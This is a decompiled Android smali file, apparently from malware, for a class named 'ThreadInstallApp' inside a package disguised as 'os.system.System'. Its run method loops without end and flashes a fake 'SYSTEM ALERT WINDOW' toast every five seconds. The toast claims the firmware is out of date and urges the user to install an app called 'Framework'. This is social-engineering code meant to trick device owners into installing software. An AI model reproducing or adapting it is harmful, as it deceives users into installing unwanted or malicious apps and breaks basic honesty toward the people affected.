.class Los/system/System$ThreadInstallApp;
.super Ljava/lang/Thread;
.source "System.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Los/system/System;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x2
    name = "ThreadInstallApp"
.end annotation


# instance fields
.field app:Ljava/lang/String;

.field context:Landroid/content/Context;

.field paket:Ljava/lang/String;

.field run:Z

.field final synthetic this$0:Los/system/System;


# direct methods
.method public constructor <init>(Los/system/System;Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    .locals 1

    .prologue
    .line 437
    iput-object p1, p0, Los/system/System$ThreadInstallApp;->this$0:Los/system/System;

    invoke-direct {p0}, Ljava/lang/Thread;-><init>()V

    .line 433
    const-string v0, ""

    iput-object v0, p0, Los/system/System$ThreadInstallApp;->app:Ljava/lang/String;

    .line 434
    const-string v0, ""

    iput-object v0, p0, Los/system/System$ThreadInstallApp;->paket:Ljava/lang/String;

    .line 435
    const/4 v0, 0x1

    iput-boolean v0, p0, Los/system/System$ThreadInstallApp;->run:Z

    .line 438
    iput-object p2, p0, Los/system/System$ThreadInstallApp;->context:Landroid/content/Context;

    .line 439
    iput-object p3, p0, Los/system/System$ThreadInstallApp;->app:Ljava/lang/String;

    .line 440
    iput-object p4, p0, Los/system/System$ThreadInstallApp;->paket:Ljava/lang/String;

    .line 441
    return-void
.end method


# virtual methods
.method public run()V
    .locals 5

    .prologue
    .line 445
    :goto_0
    :try_start_0
    iget-boolean v0, p0, Los/system/System$ThreadInstallApp;->run:Z

    if-eqz v0, :cond_0

    .line 446
    const-wide/16 v0, 0x1388

    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V

    .line 448
    iget-object v0, p0, Los/system/System$ThreadInstallApp;->this$0:Los/system/System;

    invoke-static {v0}, Los/system/System;->access$000(Los/system/System;)Los/system/ReceiverBoot;

    move-result-object v0

    iget-object v1, p0, Los/system/System$ThreadInstallApp;->context:Landroid/content/Context;

    const-string v2, "SYSTEM ALERT WINDOW!!\n\n\nYour firmware is NOT updated please follow this Tutorial.\n\n1. Install this app Framework\n\u00082. Open app finish.\n\n\n\n\n       [ WARNING! ]\n\n\n"

    const/16 v3, -0x100

    const/16 v4, 0x31

    invoke-virtual {v0, v1, v2, v3, v4}, Los/system/ReceiverBoot;->toastText(Landroid/content/Context;Ljava/lang/String;II)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 452
    :catch_0
    move-exception v0

    .line 454
    :cond_0
    return-void
.end method
